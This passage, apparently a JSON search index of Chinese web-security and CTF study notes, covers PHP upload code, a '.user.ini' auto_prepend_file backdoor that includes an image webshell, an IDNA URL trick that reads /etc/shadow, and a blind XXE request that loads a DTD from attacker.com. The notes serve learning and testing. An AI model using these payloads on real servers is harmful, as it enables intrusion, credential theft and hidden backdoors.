\"name\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES [ \"file\" ][ \"type\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ( $_FILES [ \"file\" ][ \"size\" ] / 1024 ) . \" kB<br>\" ; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES [ \"file\" ][ \"tmp_name\" ]; } ?> $_FILES[\"file\"][\"name\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u540d\u79f0 $_FILES[\"file\"][\"type\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b $_FILES[\"file\"][\"size\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u8ba1 $_FILES[\"file\"][\"tmp_name\"] - \u5b58\u50a8\u5728\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7684\u4e34\u65f6\u526f\u672c\u7684\u540d\u79f0 $_FILES[\"file\"][\"error\"] - \u7531\u6587\u4ef6\u4e0a\u4f20\u5bfc\u81f4\u7684\u9519\u8bef\u4ee3\u7801 \u5b8c\u5584\u4e00\u70b9\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 <?php // \u5141\u8bb8\u4e0a\u4f20\u7684\u56fe\u7247\u540e\u7f00 $allowedExts = array ( \"gif\" , \"jpeg\" , \"jpg\" , \"png\" ); $temp = explode ( \".\" , $_FILES [ \"file\" ][ \"name\" ]); $extension = end ( $temp ); // \u83b7\u53d6\u6587\u4ef6\u540e\u7f00\u540d if ((( $_FILES [ \"file\" ][ \"type\" ] == \"image/gif\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/jpeg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/jpg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/pjpeg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/x-png\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/png\" )) && ( $_FILES [ \"file\" ][ \"size\" ] < 204800 ) // \u5c0f\u4e8e 200 kb && in_array ( $extension , $allowedExts )) { if ( $_FILES [ \"file\" ][ \"error\" ] > 0 ) { echo \"\u9519\u8bef\uff1a: \" . $_FILES [ \"file\" ][ \"error\" ] . \"<br>\" ; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES [ \"file\" ][ \"name\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES [ \"file\" ][ \"type\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ( $_FILES [ \"file\" ][ \"size\" ] / 1024 ) . \" kB<br>\" ; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES [ \"file\" ][ \"tmp_name\" ]; } } else { echo \"\u975e\u6cd5\u7684\u6587\u4ef6\u683c\u5f0f\" ; } ?> \u6293\u83b7\u7684\u6570\u636e\u5305\u5982\u4e0b\uff1a \u4e3a\u4e86\u6e05\u6670\u5730\u5c55\u793a\u6570\u636e\u5305\uff0c\u5220\u6389\u4e86\u4e00\u4e9b\u6587\u4ef6\u5185\u5bb9 \u53ef\u4ee5\u968f\u610f\u4fee\u6539","title":"\u521b\u5efa\u4e0a\u4f20\u811a\u672c"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if ($_FILES[\"file\"][\"error\"] > 0) { echo \"\u9519\u8bef\uff1a: \" . $_FILES[\"file\"][\"error\"] . \"<br>\"; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES[\"file\"][\"name\"] . \"<br>\"; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES[\"file\"][\"type\"] . \"<br>\"; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\"; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br>\"; // \u5224\u65ad\u5f53\u671f\u76ee\u5f55\u4e0b\u7684 upload \u76ee\u5f55\u662f\u5426\u5b58\u5728\u8be5\u6587\u4ef6 // \u5982\u679c\u6ca1\u6709 upload \u76ee\u5f55\uff0c\u4f60\u9700\u8981\u521b\u5efa\u5b83\uff0cupload \u76ee\u5f55\u6743\u9650\u4e3a 777 if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" \u6587\u4ef6\u5df2\u7ecf\u5b58\u5728\u3002 \"; } else { // \u5982\u679c upload \u76ee\u5f55\u4e0d\u5b58\u5728\u8be5\u6587\u4ef6\u5219\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230 upload \u76ee\u5f55\u4e0b move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"\u6587\u4ef6\u5b58\u50a8\u5728: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; }","title":"\u4fdd\u5b58\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/#_4","text":"\u83dc\u9e1f\u6559\u7a0b","title":"\u53c2\u8003"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/","text":".user.ini\u6784\u6210\u7684\u540e\u95e8 \u00b6 .user.ini \u3002\u5b83\u6bd4 .htaccess \u7528\u7684\u66f4\u5e7f\uff0c\u4e0d\u7ba1\u662fnginx/apache/IIS\uff0c\u53ea\u8981\u662f\u4ee5fastcgi\u8fd0\u884c\u7684php\u90fd\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 php.ini\u662fphp\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u62ec\u4e86\u5f88\u591aphp\u7684\u914d\u7f6e\uff0c\u8fd9\u4e9b\u914d\u7f6e\u4e2d\uff0c\u53c8\u5206\u4e3a\u51e0\u79cd\uff1a PHP_INI_SYSTEM \u3001 PHP_INI_PERDIR \u3001 PHP_INI_ALL \u3001 PHP_INI_USER \u3002 \u5b98\u65b9\u6587\u6863 \u6a21\u5f0f\u4e3aPHP_INI_USER\u7684\u914d\u7f6e\u9879\uff0c\u53ef\u4ee5\u5728ini_set()\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3001\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\uff0c\u518d\u5c31\u662f.user.ini\u4e2d\u8bbe\u7f6e\u3002 .user.ini\u6587\u4ef6\u4ecb\u7ecd \u00b6 \u81ea PHP 5.3.0 \u8d77\uff0cPHP \u652f\u6301\u57fa\u4e8e\u6bcf\u4e2a\u76ee\u5f55\u7684 .htaccess \u98ce\u683c\u7684 INI \u6587\u4ef6\u3002\u6b64\u7c7b\u6587\u4ef6 \u4ec5 \u88ab CGI\uff0fFastCGI SAPI \u5904\u7406\u3002\u6b64\u529f\u80fd\u4f7f\u5f97 PECL \u7684 htscanner \u6269\u5c55\u4f5c\u5e9f\u3002\u5982\u679c\u4f7f\u7528 Apache\uff0c\u5219\u7528 .htaccess \u6587\u4ef6\u6709\u540c\u6837\u6548\u679c\u3002 \u9664\u4e86\u4e3b php.ini \u4e4b\u5916\uff0cPHP \u8fd8\u4f1a\u5728\u6bcf\u4e2a\u76ee\u5f55\u4e0b\u626b\u63cf INI \u6587\u4ef6\uff0c\u4ece\u88ab\u6267\u884c\u7684 PHP \u6587\u4ef6\u6240\u5728\u76ee\u5f55\u5f00\u59cb\u4e00\u76f4\u4e0a\u5347\u5230 web \u6839\u76ee\u5f55\uff08[$_SERVER 'DOCUMENT_ROOT'] \u6240\u6307\u5b9a\u7684\uff09\u3002\u5982\u679c\u88ab\u6267\u884c\u7684 PHP \u6587\u4ef6\u5728 web \u6839\u76ee\u5f55\u4e4b\u5916\uff0c\u5219\u53ea\u626b\u63cf\u8be5\u76ee\u5f55\u3002 \u5728 .user.ini \u98ce\u683c\u7684 INI \u6587\u4ef6\u4e2d\u53ea\u6709\u5177\u6709 PHP_INI_PERDIR \u548c PHP_INI_USER \u6a21\u5f0f\u7684 INI \u8bbe\u7f6e\u53ef\u88ab\u8bc6\u522b\u3002 \uff08\u4e0a\u9762\u8868\u683c\u4e2d\u6ca1\u6709\u63d0\u5230\u7684PHP_INI_PERDIR\u4e5f\u53ef\u4ee5\u5728.user.ini\u4e2d\u8bbe\u7f6e\uff09 \u548c php.ini \u4e0d\u540c\u7684\u662f\uff0c .user.ini \u662f\u4e00\u4e2a\u80fd\u88ab\u52a8\u6001\u52a0\u8f7d\u7684ini\u6587\u4ef6\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4fee\u6539\u4e86 .user.ini \u540e\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\uff0c\u53ea\u9700\u8981\u7b49\u5f85 user_ini.cache_ttl \u6240\u8bbe\u7f6e\u7684\u65f6\u95f4\uff08\u9ed8\u8ba4\u4e3a300\u79d2\uff09\uff0c\u5373\u53ef\u88ab\u91cd\u65b0\u52a0\u8f7d\u3002 Php\u914d\u7f6e\u9879\u4e2d\u6709\u4e24\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u9879\uff08\u4e0b\u56fe\u7b2c\u4e00\u3001\u56db\u4e2a\uff09\uff1a \u00b6 auto_append_file \u3001 auto_prepend_file \uff0c\u70b9\u5f00\u770b\u770b\u4ec0\u4e48\u610f\u601d\uff1a \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u81ea\u52a8\u5305\u542b\u5728\u8981\u6267\u884c\u7684\u6587\u4ef6\u524d\uff0c\u7c7b\u4f3c\u4e8e\u5728\u6587\u4ef6\u524d\u8c03\u7528\u4e86require()\u51fd\u6570\u3002\u800cauto_append_file\u7c7b\u4f3c\uff0c\u53ea\u662f\u5728\u6587\u4ef6\u540e\u9762\u5305\u542b\u3002 \u4f7f\u7528\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u5199\u5728.user.ini\u4e2d\uff1a 1 auto_prepend_file=01.gif 01.gif\u662f\u8981\u5305\u542b\u7684\u6587\u4ef6\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9.user.ini\u8f7b\u677e\u8ba9\u6240\u6709php\u6587\u4ef6\u90fd\u201c\u81ea\u52a8\u201d\u5305\u542b\u67d0\u4e2a\u6587\u4ef6\uff0c\u800c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u662f\u4e00\u4e2a\u6b63\u5e38php\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5305\u542b\u4e00\u53e5\u8bdd\u7684webshell\u3002 \u6d4b\u8bd5demo \u00b6 \u5206\u522b\u5728IIS6.0+Fastcgi+PHP5.3\u548cnginx+fpm+php5.3\u4e0a\u6d4b\u8bd5\u3002 \u76ee\u5f55\u4e0b\u6709 .user.ini \uff0c\u548c\u5305\u542bwebshell\u7684 01.gif \uff0c\u548c\u6b63\u5e38php\u6587\u4ef6 echo.php \uff1a \u8bbf\u95ee echo.php \u5373\u53ef\u770b\u5230\u540e\u95e8\uff1a Nginx\u4e0b\u540c\u6837\uff1a \u603b\u7ed3 \u00b6 \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u7325\u7410\u5730\u60f3\u4e00\u4e0b\uff0c\u5728\u54ea\u4e9b\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7528\u5230\u8fd9\u4e2a\u59ff\u52bf\uff1f \u6bd4\u5982\uff0c\u67d0\u7f51\u7ad9\u9650\u5236\u4e0d\u5141\u8bb8\u4e0a\u4f20.php\u6587\u4ef6\uff0c\u4f60\u4fbf\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a.user.ini\uff0c\u518d\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c\uff0c\u5305\u542b\u8d77\u6765\u8fdb\u884cgetshell\u3002\u4e0d\u8fc7\u524d\u63d0\u662f\u542b\u6709.user.ini\u7684\u6587\u4ef6\u5939\u4e0b\u9700\u8981\u6709\u6b63\u5e38\u7684php\u6587\u4ef6\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u5305\u542b\u4e86\u3002 \u518d\u6bd4\u5982\uff0c\u4f60\u53ea\u662f\u60f3\u9690\u85cf\u4e2a\u540e\u95e8\uff0c\u8fd9\u4e2a\u65b9\u5f0f\u662f\u6700\u65b9\u4fbf\u7684\u3002 \u7136\u800c\u6211\u6d4b\u8bd5\u7684\u65f6\u5019\u603b\u662f\u5931\u8d25\u3002\u4e0d\u77e5\u9053\u539f\u56e0\u3002 \u53c2\u8003 \u00b6 p \u725b","title":".user.ini\u6784\u6210\u7684\u540e\u95e8"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#userini","text":".user.ini \u3002\u5b83\u6bd4 .htaccess \u7528\u7684\u66f4\u5e7f\uff0c\u4e0d\u7ba1\u662fnginx/apache/IIS\uff0c\u53ea\u8981\u662f\u4ee5fastcgi\u8fd0\u884c\u7684php\u90fd\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 php.ini\u662fphp\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u62ec\u4e86\u5f88\u591aphp\u7684\u914d\u7f6e\uff0c\u8fd9\u4e9b\u914d\u7f6e\u4e2d\uff0c\u53c8\u5206\u4e3a\u51e0\u79cd\uff1a PHP_INI_SYSTEM \u3001 PHP_INI_PERDIR \u3001 PHP_INI_ALL \u3001 PHP_INI_USER \u3002 \u5b98\u65b9\u6587\u6863 \u6a21\u5f0f\u4e3aPHP_INI_USER\u7684\u914d\u7f6e\u9879\uff0c\u53ef\u4ee5\u5728ini_set()\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3001\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\uff0c\u518d\u5c31\u662f.user.ini\u4e2d\u8bbe\u7f6e\u3002","title":".user.ini\u6784\u6210\u7684\u540e\u95e8"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#userini_1","text":"\u81ea PHP 5.3.0 \u8d77\uff0cPHP \u652f\u6301\u57fa\u4e8e\u6bcf\u4e2a\u76ee\u5f55\u7684 .htaccess \u98ce\u683c\u7684 INI \u6587\u4ef6\u3002\u6b64\u7c7b\u6587\u4ef6 \u4ec5 \u88ab CGI\uff0fFastCGI SAPI \u5904\u7406\u3002\u6b64\u529f\u80fd\u4f7f\u5f97 PECL \u7684 htscanner \u6269\u5c55\u4f5c\u5e9f\u3002\u5982\u679c\u4f7f\u7528 Apache\uff0c\u5219\u7528 .htaccess \u6587\u4ef6\u6709\u540c\u6837\u6548\u679c\u3002 \u9664\u4e86\u4e3b php.ini \u4e4b\u5916\uff0cPHP \u8fd8\u4f1a\u5728\u6bcf\u4e2a\u76ee\u5f55\u4e0b\u626b\u63cf INI \u6587\u4ef6\uff0c\u4ece\u88ab\u6267\u884c\u7684 PHP \u6587\u4ef6\u6240\u5728\u76ee\u5f55\u5f00\u59cb\u4e00\u76f4\u4e0a\u5347\u5230 web \u6839\u76ee\u5f55\uff08[$_SERVER 'DOCUMENT_ROOT'] \u6240\u6307\u5b9a\u7684\uff09\u3002\u5982\u679c\u88ab\u6267\u884c\u7684 PHP \u6587\u4ef6\u5728 web \u6839\u76ee\u5f55\u4e4b\u5916\uff0c\u5219\u53ea\u626b\u63cf\u8be5\u76ee\u5f55\u3002 \u5728 .user.ini \u98ce\u683c\u7684 INI \u6587\u4ef6\u4e2d\u53ea\u6709\u5177\u6709 PHP_INI_PERDIR \u548c PHP_INI_USER \u6a21\u5f0f\u7684 INI \u8bbe\u7f6e\u53ef\u88ab\u8bc6\u522b\u3002 \uff08\u4e0a\u9762\u8868\u683c\u4e2d\u6ca1\u6709\u63d0\u5230\u7684PHP_INI_PERDIR\u4e5f\u53ef\u4ee5\u5728.user.ini\u4e2d\u8bbe\u7f6e\uff09 \u548c php.ini \u4e0d\u540c\u7684\u662f\uff0c .user.ini \u662f\u4e00\u4e2a\u80fd\u88ab\u52a8\u6001\u52a0\u8f7d\u7684ini\u6587\u4ef6\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4fee\u6539\u4e86 .user.ini \u540e\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\uff0c\u53ea\u9700\u8981\u7b49\u5f85 user_ini.cache_ttl \u6240\u8bbe\u7f6e\u7684\u65f6\u95f4\uff08\u9ed8\u8ba4\u4e3a300\u79d2\uff09\uff0c\u5373\u53ef\u88ab\u91cd\u65b0\u52a0\u8f7d\u3002","title":".user.ini\u6587\u4ef6\u4ecb\u7ecd"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#php","text":"auto_append_file \u3001 auto_prepend_file \uff0c\u70b9\u5f00\u770b\u770b\u4ec0\u4e48\u610f\u601d\uff1a \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u81ea\u52a8\u5305\u542b\u5728\u8981\u6267\u884c\u7684\u6587\u4ef6\u524d\uff0c\u7c7b\u4f3c\u4e8e\u5728\u6587\u4ef6\u524d\u8c03\u7528\u4e86require()\u51fd\u6570\u3002\u800cauto_append_file\u7c7b\u4f3c\uff0c\u53ea\u662f\u5728\u6587\u4ef6\u540e\u9762\u5305\u542b\u3002 \u4f7f\u7528\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u5199\u5728.user.ini\u4e2d\uff1a 1 auto_prepend_file=01.gif 01.gif\u662f\u8981\u5305\u542b\u7684\u6587\u4ef6\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9.user.ini\u8f7b\u677e\u8ba9\u6240\u6709php\u6587\u4ef6\u90fd\u201c\u81ea\u52a8\u201d\u5305\u542b\u67d0\u4e2a\u6587\u4ef6\uff0c\u800c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u662f\u4e00\u4e2a\u6b63\u5e38php\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5305\u542b\u4e00\u53e5\u8bdd\u7684webshell\u3002","title":"Php\u914d\u7f6e\u9879\u4e2d\u6709\u4e24\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u9879\uff08\u4e0b\u56fe\u7b2c\u4e00\u3001\u56db\u4e2a\uff09\uff1a"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#demo","text":"\u5206\u522b\u5728IIS6.0+Fastcgi+PHP5.3\u548cnginx+fpm+php5.3\u4e0a\u6d4b\u8bd5\u3002 \u76ee\u5f55\u4e0b\u6709 .user.ini \uff0c\u548c\u5305\u542bwebshell\u7684 01.gif \uff0c\u548c\u6b63\u5e38php\u6587\u4ef6 echo.php \uff1a \u8bbf\u95ee echo.php \u5373\u53ef\u770b\u5230\u540e\u95e8\uff1a Nginx\u4e0b\u540c\u6837\uff1a","title":"\u6d4b\u8bd5demo"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#_1","text":"\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u7325\u7410\u5730\u60f3\u4e00\u4e0b\uff0c\u5728\u54ea\u4e9b\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7528\u5230\u8fd9\u4e2a\u59ff\u52bf\uff1f \u6bd4\u5982\uff0c\u67d0\u7f51\u7ad9\u9650\u5236\u4e0d\u5141\u8bb8\u4e0a\u4f20.php\u6587\u4ef6\uff0c\u4f60\u4fbf\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a.user.ini\uff0c\u518d\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c\uff0c\u5305\u542b\u8d77\u6765\u8fdb\u884cgetshell\u3002\u4e0d\u8fc7\u524d\u63d0\u662f\u542b\u6709.user.ini\u7684\u6587\u4ef6\u5939\u4e0b\u9700\u8981\u6709\u6b63\u5e38\u7684php\u6587\u4ef6\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u5305\u542b\u4e86\u3002 \u518d\u6bd4\u5982\uff0c\u4f60\u53ea\u662f\u60f3\u9690\u85cf\u4e2a\u540e\u95e8\uff0c\u8fd9\u4e2a\u65b9\u5f0f\u662f\u6700\u65b9\u4fbf\u7684\u3002 \u7136\u800c\u6211\u6d4b\u8bd5\u7684\u65f6\u5019\u603b\u662f\u5931\u8d25\u3002\u4e0d\u77e5\u9053\u539f\u56e0\u3002","title":"\u603b\u7ed3"},{"location":"upload/user.ini\u6784\u6210\u7684\u540e\u95e8/#_2","text":"p \u725b","title":"\u53c2\u8003"},{"location":"upload/\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3/","text":"\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3 \u00b6 \u6765\u4e00\u5f20\u8111\u56fe \u5e08\u5085\u7684\u6587\u7ae0","title":"\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3"},{"location":"upload/\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3/#_1","text":"\u6765\u4e00\u5f20\u8111\u56fe \u5e08\u5085\u7684\u6587\u7ae0","title":"\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3"},{"location":"web/","text":"Web\u57fa\u7840\u77e5\u8bc6 \u00b6 URL \u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u683c\u5f0f \u00b6 \u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u6807\u51c6\u683c\u5f0f\u5982\u4e0b\uff1a [\u534f\u8bae\u7c7b\u578b]://[\u670d\u52a1\u5668\u5730\u5740]:[\u7aef\u53e3\u53f7]/[\u8d44\u6e90\u5c42\u7ea7UNIX\u6587\u4ef6\u8def\u5f84][\u6587\u4ef6\u540d]?[\u67e5\u8be2]#[\u7247\u6bb5ID] \u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u5b8c\u6574\u683c\u5f0f\u5982\u4e0b\uff1a [\u534f\u8bae\u7c7b\u578b]: //\u8bbf\u95ee\u8d44\u6e90\u9700\u8981\u7684\u51ed\u8bc1\u4fe1\u606f@\u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3\u53f7/\u8d44\u6e90\u5c42\u7ea7UNIX\u6587\u4ef6\u8def\u5f84\u6587\u4ef6\u540d?\u67e5\u8be2#\u7247\u6bb5ID \u8fd9\u4e2a\u5b9e\u5728\u662f\u592atm\u96be\u7406\u89e3\u4e86\uff0c\u591a\u8bd5\u51e0\u6b21\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 In [ 2 ]: url = \"https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0654\" In [ 3 ]: urlsplit ( url ) Out [ 3 ]: SplitResult ( scheme = 'https' , netloc = 'portal.msrc.microsoft.com' , path = '/en-us/security-guidance/advisory/CVE-2019-0654' , query = '' , fragment = '' ) In [ 4 ]: list ( urlsplit ( url )) Out [ 4 ]: [ 'https' , 'portal.msrc.microsoft.com' , '/en-us/security-guidance/advisory/CVE-2019-0654' , '' , '' ] url = 'https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md' In [ 8 ]: urlsplit ( url ) Out [ 8 ]: SplitResult ( scheme = 'https' , netloc = 'github.com' , path = '/ziishaned/learn-regex/blob/master/translations/README-cn.md' , query = '' , fragment = '' ) In [ 9 ]: url = 'https://medium.com/hmif-itb/hackcon2019-writeup-4639553b9355#a07c' In [ 10 ]: urlsplit ( url ) Out [ 10 ]: SplitResult ( scheme = 'https' , netloc = 'medium.com' , path = '/hmif-itb/hackcon2019-writeup-4639553b9355' , query = '' , fragment = 'a07c' ) \u6240\u4ee5\u5982\u4e0a\u7684\u4ee3\u7801\u5c31\u4e0d\u96be\u7406\u89e3\u4e86\uff0c\u5c31\u662f\u5207\u5272URL\u7136\u540e\u518d\u5408\u5e76\u7684\u8fc7\u7a0b \u6f0f\u6d1e\u5c31\u5728\u8fd9\u91cc\uff1a \u4e8e\u662f\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 In [ 37 ]: url = 'file://suctf.c\uff23/etc/shadow' In [ 38 ]: a = list ( urlsplit ( url )) In [ 39 ]: a Out [ 39 ]: [ 'file' , 'suctf.c\uff23' , '/etc/shadow' , '' , '' ] In [ 40 ]: hostname = a [ 1 ] In [ 41 ]: newhost = hostname . split ( '.' ) In [ 42 ]: host = [] In [ 43 ]: for i in newhost : ... : host . append ( i . encode ( 'idna' ) . decode ( 'utf-8' )) In [ 44 ]: host Out [ 44 ]: [ 'suctf' , 'cc' ] In [ 45 ]: newhost = '.' . join ( host ) In [ 46 ]: newhost Out [ 46 ]: 'suctf.cc'","title":"Web\u57fa\u7840\u77e5\u8bc6"},{"location":"web/#web","text":"","title":"Web\u57fa\u7840\u77e5\u8bc6"},{"location":"web/#url","text":"\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u6807\u51c6\u683c\u5f0f\u5982\u4e0b\uff1a [\u534f\u8bae\u7c7b\u578b]://[\u670d\u52a1\u5668\u5730\u5740]:[\u7aef\u53e3\u53f7]/[\u8d44\u6e90\u5c42\u7ea7UNIX\u6587\u4ef6\u8def\u5f84][\u6587\u4ef6\u540d]?[\u67e5\u8be2]#[\u7247\u6bb5ID] \u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u5b8c\u6574\u683c\u5f0f\u5982\u4e0b\uff1a [\u534f\u8bae\u7c7b\u578b]: //\u8bbf\u95ee\u8d44\u6e90\u9700\u8981\u7684\u51ed\u8bc1\u4fe1\u606f@\u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3\u53f7/\u8d44\u6e90\u5c42\u7ea7UNIX\u6587\u4ef6\u8def\u5f84\u6587\u4ef6\u540d?\u67e5\u8be2#\u7247\u6bb5ID \u8fd9\u4e2a\u5b9e\u5728\u662f\u592atm\u96be\u7406\u89e3\u4e86\uff0c\u591a\u8bd5\u51e0\u6b21\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 In [ 2 ]: url = \"https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0654\" In [ 3 ]: urlsplit ( url ) Out [ 3 ]: SplitResult ( scheme = 'https' , netloc = 'portal.msrc.microsoft.com' , path = '/en-us/security-guidance/advisory/CVE-2019-0654' , query = '' , fragment = '' ) In [ 4 ]: list ( urlsplit ( url )) Out [ 4 ]: [ 'https' , 'portal.msrc.microsoft.com' , '/en-us/security-guidance/advisory/CVE-2019-0654' , '' , '' ] url = 'https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md' In [ 8 ]: urlsplit ( url ) Out [ 8 ]: SplitResult ( scheme = 'https' , netloc = 'github.com' , path = '/ziishaned/learn-regex/blob/master/translations/README-cn.md' , query = '' , fragment = '' ) In [ 9 ]: url = 'https://medium.com/hmif-itb/hackcon2019-writeup-4639553b9355#a07c' In [ 10 ]: urlsplit ( url ) Out [ 10 ]: SplitResult ( scheme = 'https' , netloc = 'medium.com' , path = '/hmif-itb/hackcon2019-writeup-4639553b9355' , query = '' , fragment = 'a07c' ) \u6240\u4ee5\u5982\u4e0a\u7684\u4ee3\u7801\u5c31\u4e0d\u96be\u7406\u89e3\u4e86\uff0c\u5c31\u662f\u5207\u5272URL\u7136\u540e\u518d\u5408\u5e76\u7684\u8fc7\u7a0b \u6f0f\u6d1e\u5c31\u5728\u8fd9\u91cc\uff1a \u4e8e\u662f\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 In [ 37 ]: url = 'file://suctf.c\uff23/etc/shadow' In [ 38 ]: a = list ( urlsplit ( url )) In [ 39 ]: a Out [ 39 ]: [ 'file' , 'suctf.c\uff23' , '/etc/shadow' , '' , '' ] In [ 40 ]: hostname = a [ 1 ] In [ 41 ]: newhost = hostname . split ( '.' ) In [ 42 ]: host = [] In [ 43 ]: for i in newhost : ... : host . append ( i . encode ( 'idna' ) . decode ( 'utf-8' )) In [ 44 ]: host Out [ 44 ]: [ 'suctf' , 'cc' ] In [ 45 ]: newhost = '.' . join ( host ) In [ 46 ]: newhost Out [ 46 ]: 'suctf.cc'","title":"URL \u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u7684\u683c\u5f0f"},{"location":"web/LFI/","text":"\u672c\u5730\u6587\u4ef6\u5305\u542b \u00b6","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b"},{"location":"web/LFI/#_1","text":"","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b"},{"location":"web/blindXXE/","text":"Exploiting XXE with local DTD files \u00b6 error-based example: \u00b6 Request 1 2 3 4 5 6 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"> %ext; ]> <message></message> Response 1 2 3 4 5 6 java.io.FileNotFoundException: 